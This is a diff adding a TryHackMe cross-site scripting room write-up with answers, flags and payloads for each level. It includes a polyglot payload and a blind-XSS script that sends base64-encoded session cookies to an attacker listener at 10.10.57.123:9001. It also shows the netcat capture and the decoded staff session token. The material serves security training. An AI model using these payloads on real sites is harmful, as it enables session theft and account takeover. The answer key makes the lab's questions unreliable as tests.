@@ -1,0 +1,95 @@
+#Task 1 Room Brief 
+
+- What does XSS stand for?
+Cross-Site Scripting
+
+#Task 2 XSS Payloads 
+- Which document property could contain the user's session token?
+document.cookie
+
+
+- Which JavaScript method is often used as a Proof Of Concept?
+alert
+
+
+#Task 3 Reflected XSS 
+- Where in an URL is a good place to test for reflected XSS?
+parameters
+
+
+#Task 4 Stored XSS 
+- How are stored XSS payloads usually stored on a website?
+database
+
+#Task 5 DOM Based XSS 
+- What unsafe JavaScript method is good to look for in source code?
+eval()
+
+
+#Task 6 Blind XSS 
+- What tool can you use to test for Blind XSS?
+xsshunter
+
+
+- What type of XSS is very similar to Blind XSS?
+Stored XSS
+
+
+# Task 7 Perfecting your payload 
+Level One
+<script>alert('THM');</script>
+
+Level two
+"><script>alert('THM');</script>
+
+Level three
+</textarea><script>alert('THM');</script>
+
+Level four
+';alert('THM');//
+
+Level five
+<sscriptcript>alert('THM');</sscriptcript>
+
+Level six
+/images/cat.jpg" onload="alert('THM');
+or A XSS polyglot 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+THM{XSS_MASTER}
+
+
+- What is the flag you received from level six?
+THM{XSS_MASTER}
+
+
+#Task 8 Practical Example (Blind XSS) 
+Create account
+sigup--> create ticket
+</textarea><script>fetch('http://10.10.57.123:9001?cookie=' + btoa(document.cookie) );</script>
+
+
+nc -nlvp 9001
+Listening on [0.0.0.0] (family 0, port 9001)
+Connection from 10.10.55.84 49200 received!
+GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
+Host: 10.10.57.123:9001
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
+Accept: */*
+Origin: http://172.17.0.1
+Referer: http://172.17.0.1/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+
+echo 'c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==' | base64 -d
+staff-session=4AB305E55955197693F01D6F8FD2D321
+
+answer:4AB305E55955197693F01D6F8FD2D321
+
+
+https://tryhackme.com/room/xssgi
+https://medium.com/@ERBATMAN/tryhackme-jr-penetration-tester-introduction-to-web-hacking-cross-site-scripting-part-3-bd2f0d9b15fa
+
+
+
